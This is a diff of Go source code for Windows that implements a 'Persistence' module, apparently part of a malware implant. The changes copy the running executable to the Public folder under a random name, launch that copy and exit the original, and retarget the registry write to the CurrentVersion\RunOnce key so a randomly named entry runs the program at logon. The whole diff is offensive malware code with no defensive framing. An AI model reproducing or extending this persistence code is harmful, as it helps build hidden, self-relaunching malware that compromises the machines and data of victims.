@@ -1,39 +1,48 @@
 package main
 
 import (
-	"golang.org/x/sys/windows/registry"
 	"io/ioutil"
 	"math/rand"
 	"os"
+	"os/exec"
 	"strings"
 	"syscall"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 type Persistence struct{}
 
 func (p *Persistence) Init(config Config) error {
+	dst := os.Getenv("public") + "\\" + RandomString(7) + ".exe"
 	var err error
 	if config.install {
-		err = Install()
+		err = Install(dst)
+		if err != nil {
+			return err
+		}
 	}
 	if config.registry {
 		err = Registry()
+		if err != nil {
+			return err
+		}
 	}
 	return err
 }
 
-func Install() error {
+func Install(dst string) error {
 	filename, err := os.Executable()
 	if err != nil {
 		return err
 	}
 	if !strings.Contains(filename, os.Getenv("public")) {
-		err := CopyFile(filename, os.Getenv("public")+"\\"+RandomString(7)+".exe")
+		err := CopyFile(filename, dst)
 		if err != nil {
 			return err
 		}
 	}
-	cFilename, err := syscall.UTF16PtrFromString(filename)
+	cFilename, err := syscall.UTF16PtrFromString(dst)
 	if err != nil {
 		return err
 	}
@@ -41,7 +50,10 @@ func Install() error {
 	if err != nil {
 		return err
 	}
-	return nil
+	cmd := exec.Command(dst)
+	err = cmd.Start()
+	os.Exit(0)
+	return err
 }
 
 func Registry() error {
@@ -51,7 +63,7 @@ func Registry() error {
 	}
 	registryName := RandomString(8)
 	key, err := registry.OpenKey(registry.CURRENT_USER,
-		`Software\Microsoft\Windows\CurrentVersion\Audio`,
+		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
 		registry.QUERY_VALUE|registry.SET_VALUE)
 	if err != nil {
 		return err
